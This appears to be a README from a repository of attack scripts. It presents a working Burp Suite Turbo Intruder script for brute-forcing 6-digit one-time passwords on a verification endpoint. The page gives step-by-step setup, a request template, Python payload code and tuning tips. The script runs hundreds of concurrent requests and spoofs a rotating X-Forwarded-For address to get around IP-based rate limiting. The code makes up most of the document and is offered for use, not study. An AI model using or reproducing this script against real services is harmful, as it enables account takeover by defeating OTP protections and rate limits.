# Race-Condition-Scripts

## OTP Brute-Force with IP Rotation (Race Condition Exploit)

 ### How to Configure

1. In Burp Suite:
   - Capture a legitimate OTP request
   - Right-click → "Convert to Turbo Intruder attack"
   - Replace the OTP value with `%s` in the body
   - Add/Modify the `X-Forwarded-For` header to use `%s`

Example request template:

```

POST /verify-otp HTTP/1.1

Host: target.com

X-Forwarded-For: %s

Content-Type: application/json

  

{"OTP":"%s"}

```

Payload:
```py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=300,
                          requestsPerConnection=100,
                          pipeline=False)

    # Initialize IP counter (starts at 1.1.1.1)
    ip_parts = [1, 1, 1, 1]

    for otp in range(310000, 999999):  # 000000 to 999999
        # Format current IP
        current_ip = "%d.%d.%d.%d" % tuple(ip_parts)
        
        # Increment IP (1.1.1.1 → 1.1.1.2 → ... → 1.1.1.255 → 1.1.2.0)
        ip_parts[3] += 1
        if ip_parts[3] > 255:
            ip_parts[3] = 1
            ip_parts[2] += 1
            if ip_parts[2] > 255:
                ip_parts[2] = 1
                ip_parts[1] += 1
                if ip_parts[1] > 255:
                    ip_parts[1] = 1
                    ip_parts[0] += 1

        # Pad OTP with leading zeros
        otp_str = str(otp).zfill(6)
        
        # Queue the request with parameters in correct order
        # First %s is for X-Forwarded-For (IP)
        # Second %s is for OTP in JSON body
        engine.queue(target.req, [current_ip, otp_str])


def handleResponse(req, interesting):
    if req.status != 404:
        table.add(req)

```
### Request Structure

The script generates requests with:

1. **Header**: `X-Forwarded-For: [current IP]` (e.g., `X-Forwarded-For: 1.1.1.1`)
2. **JSON Body**: `{"OTP": "[padded OTP]"}` (e.g., `{"OTP": "318121"}`)
### Attack Workflow

1. **IP Rotation**: Cycles through IPs from 1.1.1.1 to 255.255.255.255
2. **OTP Generation**: Tests all 6-digit combinations from 310000 upwards
3. **Concurrent Execution**: 300 parallel connections × 100 requests each
4. **Response Handling**: Any non-404 response is flagged as potentially valid
### Important Notes

- Adjust the OTP range (`000000-999999`) based on target hints
- Modify `concurrentConnections` based on target stability
- The IP rotation helps bypass IP-based rate limiting
- High concurrency exploits potential race conditions in OTP validation